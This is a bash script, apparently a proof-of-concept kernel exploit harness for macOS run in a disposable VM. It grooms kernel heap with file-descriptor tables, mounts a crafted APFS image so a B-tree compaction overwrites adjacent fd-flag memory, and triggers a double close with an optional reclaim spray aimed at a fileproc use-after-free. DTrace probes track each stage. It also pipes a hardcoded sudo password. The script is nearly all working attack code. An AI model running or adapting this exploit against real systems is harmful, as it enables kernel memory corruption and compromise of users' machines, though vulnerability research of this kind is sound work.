#!/bin/bash
#
# Disposable-VM-only APFS fileproc-lifecycle test. It parks one close while a
# FIFO read holds the fileproc iocount, clears UF_RESERVED|UF_CLOSING through
# the proven predecessor write, then starts a second close on the same fd.

set -euo pipefail

[[ $# -ge 1 && $# -le 2 ]] || {
    echo "usage: $0 crafted_image [workers]" >&2
    exit 2
}

IMAGE=$1
WORKERS=${2:-512}
RECLAIM=${RECLAIM:-0}
[[ -f $IMAGE ]] || exit 1
[[ $WORKERS =~ ^[0-9]+$ ]] || exit 2
[[ $RECLAIM == 0 || $RECLAIM == 1 ]] || exit 2

RUN_ID=$(date -u +%Y%m%dT%H%M%SZ)
WORK=/Users/testtest/apfs_fd_lifecycle_runs/$RUN_ID
MAP_TRACE=$WORK/map.d
MAP_LOG=$WORK/map.log
MAP_ERR=$WORK/map.err
MAP_PID=$WORK/map.pid
NODE_TRACE=$WORK/node.d
NODE_LOG=$WORK/node.log
NODE_ERR=$WORK/node.err
NODE_PID=$WORK/node.pid
COMPACT_TRACE=$WORK/compact.d
COMPACT_LOG=$WORK/compact.log
COMPACT_ERR=$WORK/compact.err
COMPACT_PID=$WORK/compact.pid
LIFECYCLE_TRACE=$WORK/lifecycle.d
LIFECYCLE_LOG=$WORK/lifecycle.log
LIFECYCLE_ERR=$WORK/lifecycle.err
LIFECYCLE_PID=$WORK/lifecycle.pid
GROOM_LOG=$WORK/groom.log
GROOM_PID=$WORK/groom.pid
RUN_IMAGE=$WORK/input.img
UNIQUE_MAP=$WORK/fd_flags_unique.txt
PAIRS=$WORK/victim_hole_pairs.txt
ATTACH_LOG=$WORK/attach.log
MOUNT_LOG=$WORK/mount.log
MOUNT_POINT=/Volumes/CODEXBTREE
BASE_DEVICE=
MOUNT_PID=
KEEP_GROOM=0

stop_dtrace()
{
    local pid_file=$1
    if [[ -f $pid_file ]]; then
        printf 'test\n' | sudo -S kill -INT "$(cat "$pid_file")" 2>/dev/null || true
        sleep 1
        printf 'test\n' | sudo -S kill -KILL "$(cat "$pid_file")" 2>/dev/null || true
    fi
}

cleanup()
{
    stop_dtrace "$MAP_PID"
    stop_dtrace "$NODE_PID"
    stop_dtrace "$COMPACT_PID"
    stop_dtrace "$LIFECYCLE_PID"
    if [[ -n $MOUNT_PID ]]; then
        printf 'test\n' | sudo -S kill -CONT "$MOUNT_PID" 2>/dev/null || true
    fi
    if mount | grep -q " on $MOUNT_POINT "; then
        printf 'test\n' | sudo -S umount -f "$MOUNT_POINT" 2>/dev/null || true
    fi
    if [[ -n $BASE_DEVICE ]]; then
        hdiutil detach -force "$BASE_DEVICE" >/dev/null 2>&1 || true
    fi
    if [[ $KEEP_GROOM -eq 0 && -f $GROOM_PID ]]; then
        kill -TERM "$(cat "$GROOM_PID")" 2>/dev/null || true
    fi
}
trap cleanup EXIT

if mount | grep -q " on $MOUNT_POINT "; then
    echo "$MOUNT_POINT is already mounted" >&2
    exit 1
fi
printf 'test\n' | sudo -S mkdir -p "$MOUNT_POINT"
printf 'test\n' | sudo -S chown testtest:staff "$MOUNT_POINT"
mkdir -p "$WORK"
cp "$IMAGE" "$RUN_IMAGE"
echo "$WORK" > /Users/testtest/apfs_fd_lifecycle_latest_run

cat > "$MAP_TRACE" <<'DTRACE'
#pragma D option quiet
syscall::fcntl*:return
/((struct proc *)curproc)->p_fd.fd_nfiles == 16384/
{
    printf("FD_FLAGS pid=%d cpu=%d result=%p\n", pid, cpu,
        ((struct proc *)curproc)->p_fd.fd_ofileflags);
}
DTRACE
printf 'test\n' | sudo -S sh -c \
    "umask 022; dtrace -w -s '$MAP_TRACE' >'$MAP_LOG' 2>'$MAP_ERR' & echo \$! >'$MAP_PID'"
sleep 2
GROOM_MODE=-l
[[ $RECLAIM -eq 1 ]] && GROOM_MODE=-r
nohup /Users/testtest/fdtable_exact_groom "$GROOM_MODE" -n "$WORKERS" \
    >"$GROOM_LOG" 2>&1 & echo $! >"$GROOM_PID"
for _ in $(seq 1 60); do
    READY=$(grep -c '^worker .* ready)' "$GROOM_LOG" 2>/dev/null || true)
    [[ $READY -eq $WORKERS ]] && break
    sleep 1
done
stop_dtrace "$MAP_PID"
MAP_COUNT=$(awk '!seen[$4]++ {count++} END {print count + 0}' "$MAP_LOG")
echo "$MAP_COUNT live fd-flags buffers mapped before mount"
[[ $MAP_COUNT -eq $WORKERS ]] || {
    cat "$MAP_ERR" >&2
    exit 1
}

awk '!seen[$4]++ {
    gsub(/^pid=/, "", $2);
    gsub(/^result=/, "", $4);
    print $2, "0x" $4
}' "$MAP_LOG" | sort -k2,2 > "$UNIQUE_MAP"

: > "$PAIRS"
PENDING_PID=
PENDING_ADDR=
while read -r current_pid current_addr; do
    if [[ -n $PENDING_ADDR ]] &&
        (( $((current_addr)) - $((PENDING_ADDR)) == 0x4000 )); then
        printf '%s %s %s %s\n' \
            "$PENDING_PID" "$PENDING_ADDR" "$current_pid" "$current_addr" \
            >> "$PAIRS"
        PENDING_PID=
        PENDING_ADDR=
    else
        PENDING_PID=$current_pid
        PENDING_ADDR=$current_addr
    fi
done < "$UNIQUE_MAP"

PAIR_COUNT=$(wc -l < "$PAIRS" | tr -d ' ')
[[ $PAIR_COUNT -gt 0 ]] || {
    echo "mapped wave contained no contiguous 16 KiB pairs" >&2
    exit 1
}
while read -r victim_pid victim_addr hole_pid hole_addr; do
    kill -KILL "$hole_pid"
done < "$PAIRS"
sleep 1
echo "$PAIR_COUNT mapped holes released with lower victims held"

cat > "$NODE_TRACE" <<'DTRACE'
#pragma D option quiet
fbt:com.apple.filesystems.apfs:apfs_get_fsroot_tree:entry
/execname == "mount_apfs"/
{
    self->in_fsroot = 1;
    self->tree_out = (uint64_t)arg3;
}
fbt:com.apple.filesystems.apfs:apfs_get_fsroot_tree:return
/self->in_fsroot/
{
    self->tree = *(uint64_t *)self->tree_out;
    self->node = *(uint64_t *)(self->tree + 0x38);
    printf("NODE_LIVE pid=%d cpu=%d tree=%p node=%p\n",
        pid, cpu, self->tree, self->node);
    self->in_fsroot = 0;
    stop();
}
DTRACE
printf 'test\n' | sudo -S sh -c \
    "umask 022; dtrace -w -s '$NODE_TRACE' >'$NODE_LOG' 2>'$NODE_ERR' & echo \$! >'$NODE_PID'"

sleep 2
hdiutil attach -nomount -noverify "$RUN_IMAGE" >"$ATTACH_LOG" 2>&1
BASE_DEVICE=$(awk '/^\/dev\/disk/ {print $1; exit}' "$ATTACH_LOG" | sed 's/s[0-9]*$//')
APFS_DEVICE=$(awk '/^\/dev\/disk/ {device=$1} END {print device}' "$ATTACH_LOG")
printf 'test\n' | sudo -S /sbin/mount_apfs \
    -o nodev,noowners,nosuid,nobrowse,nofollow \
    "$APFS_DEVICE" "$MOUNT_POINT" >"$MOUNT_LOG" 2>&1 &

for _ in $(seq 1 30); do
    grep -q '^NODE_LIVE ' "$NODE_LOG" 2>/dev/null && break
    sleep 1
done
grep -q '^NODE_LIVE ' "$NODE_LOG" || exit 1
MOUNT_PID=$(awk -F'[ =]' '/^NODE_LIVE / {print $3; exit}' "$NODE_LOG")
NODE_ADDR=$(awk -F'node=' '/^NODE_LIVE / {print "0x"$2; exit}' "$NODE_LOG")
NODE_NUM=$((NODE_ADDR))
VICTIM_ADDR=$(printf '0x%016x' "$((NODE_NUM - 0x4000))")
MATCH=$(awk -v target="$NODE_ADDR" '$4 == target {print; exit}' "$PAIRS")
echo "fs-root node live at $NODE_ADDR; required victim $VICTIM_ADDR"
stop_dtrace "$NODE_PID"

if [[ -z $MATCH ]]; then
    echo "placement miss; crafted operation not triggered"
    printf 'test\n' | sudo -S kill -CONT "$MOUNT_PID"
    exit 3
fi

read -r VICTIM_PID VICTIM_ADDR HOLE_PID HOLE_ADDR <<< "$MATCH"
echo "exact live victim: pid=$VICTIM_PID addr=$VICTIM_ADDR node=$NODE_ADDR"
sync
printf 'test\n' | sudo -S kill -CONT "$MOUNT_PID"
for _ in $(seq 1 30); do
    mount | grep -q " on $MOUNT_POINT " && break
    sleep 1
done
mount | grep -q " on $MOUNT_POINT " || exit 1

cat > "$LIFECYCLE_TRACE" <<DTRACE
#pragma D option quiet
#pragma D option switchrate=10ms
uint64_t target_fp;
uint64_t target_fg;
uint64_t first_tid;
uint64_t second_tid;
int close_entries;
int delayed;
int fp_free_count;
int fp_reclaim_count;
int fg_free_count;
int fg_reclaim_count;

fbt::fp_close_and_unlock_with_action:entry
/pid == $VICTIM_PID && arg2 == 16383/
{
    printf("CLOSE_ENTRY pid=%d flags=0x%x fp=%p fd=%d\\n",
        pid, *((unsigned char *)$VICTIM_ADDR + 0x3fff), arg3, arg2);
    target_fp = target_fp == 0 ? arg3 : target_fp;
    first_tid = first_tid == 0 ? tid : first_tid;
    second_tid = tid != first_tid ? tid : second_tid;
    self->close_sequence = ++close_entries;
}
fbt:mach_kernel:_sleep:entry
/pid == $VICTIM_PID &&
 (*((unsigned char *)$VICTIM_ADDR + 0x3fff) & 0xc) == 0xc/
{
    printf("CLOSE_PARKED pid=%d flags=0x%x channel=%p\\n",
        pid, *((unsigned char *)$VICTIM_ADDR + 0x3fff), arg0);
}
fbt:mach_kernel:mac_file_notify_close:entry
/pid == $VICTIM_PID && target_fp != 0/
{
    target_fg = target_fg == 0 ? arg1 : target_fg;
}
fbt:mach_kernel:mac_file_notify_close:entry
/pid == $VICTIM_PID && $RECLAIM == 1 &&
 self->close_sequence == 2 && delayed == 0/
{
    delayed = 1;
    printf("SECOND_CLOSE_HELD_PREDRAIN pid=%d tid=%d target_fp=%p "
        "target_fg=%p\\n", pid, tid, target_fp, target_fg);
    raise(16);
    chill(500000000);
    printf("SECOND_CLOSE_RELEASED_PREDRAIN pid=%d tid=%d target_fp=%p\\n",
        pid, tid, target_fp);
}
fbt:mach_kernel:zfree_ext:entry
/pid == $VICTIM_PID && target_fp != 0 && arg2 == target_fp/
{
    self->target_free = 1;
    fp_free_count++;
    printf("TARGET_FP_ZFREE_ENTRY pid=%d tid=%d target_fp=%p count=%d "
        "reclaims=%d\\n",
        pid, tid, target_fp, fp_free_count, fp_reclaim_count);
}
fbt:mach_kernel:zfree_ext:return
/self->target_free/
{
    printf("TARGET_FP_ZFREE_RETURN pid=%d tid=%d target_fp=%p count=%d\\n",
        pid, tid, target_fp, fp_free_count);
    self->target_free = 0;
}
fbt:mach_kernel:zalloc_ext:return
/pid == $VICTIM_PID && target_fp != 0 && arg1 == target_fp/
{
    fp_reclaim_count++;
    self->reclaimed_target_fp = 1;
    printf("TARGET_FP_RECLAIM pid=%d tid=%d target_fp=%p count=%d\\n",
        pid, tid, target_fp, fp_reclaim_count);
}
fbt:mach_kernel:fg_alloc_init:return
/pid == $VICTIM_PID && target_fg != 0 && arg1 == target_fg/
{
    fg_reclaim_count++;
    self->reclaimed_target_fg = 1;
    printf("TARGET_FG_RECLAIM pid=%d tid=%d target_fg=%p count=%d\\n",
        pid, tid, target_fg, fg_reclaim_count);
}
fbt:mach_kernel:zfree_ext:entry
/pid == $VICTIM_PID && target_fg != 0 && arg2 == target_fg/
{
    fg_free_count++;
    printf("TARGET_FG_ZFREE_ENTRY pid=%d tid=%d target_fg=%p count=%d "
        "reclaims=%d\\n",
        pid, tid, target_fg, fg_free_count, fg_reclaim_count);
}
fbt:mach_kernel:falloc_withinit:entry
/pid == $VICTIM_PID && $RECLAIM == 1/
{
    self->falloc_resultfp = arg3;
    self->falloc_resultfd = arg4;
}
fbt:mach_kernel:falloc_withinit:return
/pid == $VICTIM_PID && self->falloc_resultfp != 0 &&
 self->reclaimed_target_fp/
{
    printf("TARGET_FP_INSTALLED pid=%d tid=%d fd=%d fp=%p target_fp=%p\\n",
        pid, tid, *(int *)self->falloc_resultfd,
        *(uint64_t *)self->falloc_resultfp, target_fp);
}
fbt:mach_kernel:falloc_withinit:return
/pid == $VICTIM_PID && self->falloc_resultfp != 0/
{
    self->falloc_resultfp = 0;
    self->falloc_resultfd = 0;
    self->reclaimed_target_fp = 0;
    self->reclaimed_target_fg = 0;
}
fbt:mach_kernel:os_ref_panic_underflow:entry
/pid == $VICTIM_PID/
{
    printf("REFCOUNT_UNDERFLOW pid=%d tid=%d object=%p target_fp=%p "
        "fp_reclaims=%d fg_reclaims=%d\\n",
        pid, tid, arg0, target_fp, fp_reclaim_count, fg_reclaim_count);
}
fbt::fp_close_and_unlock_with_action:return
/pid == $VICTIM_PID && self->close_sequence != 0/
{
    printf("CLOSE_RETURN pid=%d tid=%d sequence=%d result=%d\\n",
        pid, tid, self->close_sequence, arg1);
    self->close_sequence = 0;
}
DTRACE
printf 'test\n' | sudo -S sh -c \
    "umask 022; dtrace -w -s '$LIFECYCLE_TRACE' >'$LIFECYCLE_LOG' 2>'$LIFECYCLE_ERR' & echo \$! >'$LIFECYCLE_PID'"
sleep 2
kill -USR1 "$VICTIM_PID"
for _ in $(seq 1 50); do
    grep -q '^CLOSE_PARKED ' "$LIFECYCLE_LOG" 2>/dev/null && break
    sleep 0.1
done
grep -q '^CLOSE_PARKED ' "$LIFECYCLE_LOG" || {
    cat "$LIFECYCLE_LOG" >&2
    cat "$LIFECYCLE_ERR" >&2
    exit 1
}
echo "first close parked with UF_RESERVED|UF_CLOSING set"

cat > "$COMPACT_TRACE" <<DTRACE
#pragma D option quiet
fbt:com.apple.filesystems.apfs:btree_node_compact:entry
/execname == "touch"/
{
    printf("TARGET_FLAG_BEFORE addr=$VICTIM_ADDR+0x3fff value=0x%x\\n",
        *((unsigned char *)$VICTIM_ADDR + 0x3fff));
    printf("VICTIM_BEFORE addr=$VICTIM_ADDR+0x36c0\\n");
    tracemem((char *)$VICTIM_ADDR + 0x36c0, 0x100);
}
fbt:com.apple.filesystems.apfs:btree_node_compact:return
/execname == "touch"/
{
    printf("TARGET_FLAG_AFTER addr=$VICTIM_ADDR+0x3fff value=0x%x\\n",
        *((unsigned char *)$VICTIM_ADDR + 0x3fff));
    printf("VICTIM_AFTER_MEMMOVE addr=$VICTIM_ADDR+0x36c0\\n");
    tracemem((char *)$VICTIM_ADDR + 0x36c0, 0x100);
    chill(500000000);
    exit(0);
}
DTRACE
printf 'test\n' | sudo -S sh -c \
    "umask 022; dtrace -w -s '$COMPACT_TRACE' >'$COMPACT_LOG' 2>'$COMPACT_ERR' & echo \$! >'$COMPACT_PID'"
sleep 2
sync
rm -f "$MOUNT_POINT/CODEX_PRENODE_PLACEMENT" 2>/dev/null || true
touch "$MOUNT_POINT/CODEX_PRENODE_PLACEMENT"
sync
sleep 2
cat "$COMPACT_LOG"
grep -q '^TARGET_FLAG_BEFORE .* value=0xc$' "$COMPACT_LOG"
grep -q '^TARGET_FLAG_AFTER .* value=0x40$' "$COMPACT_LOG"
echo "UF_RESERVED|UF_CLOSING cleared on the parked live descriptor"

KEEP_GROOM=1
kill -USR2 "$VICTIM_PID"
if [[ $RECLAIM -eq 1 ]]; then
    echo "second close launched; DTrace will hold it pre-drain and signal the reclaim spray"
else
    echo "second close launched; releasing the held FIFO read"
fi
sleep 5
cat "$LIFECYCLE_LOG"
tail -40 "$GROOM_LOG"
kill -0 "$VICTIM_PID"
if [[ $RECLAIM -eq 1 ]]; then
    grep -q '^SECOND_CLOSE_HELD_PREDRAIN ' "$LIFECYCLE_LOG"
    grep -q '^TARGET_FP_RECLAIM ' "$LIFECYCLE_LOG"
    grep -q '^TARGET_FP_INSTALLED ' "$LIFECYCLE_LOG"
    grep -q '^TARGET_FP_ZFREE_ENTRY .* count=2 ' "$LIFECYCLE_LOG"
fi
echo "victim survived the double-close trigger; inspect lifecycle trace"
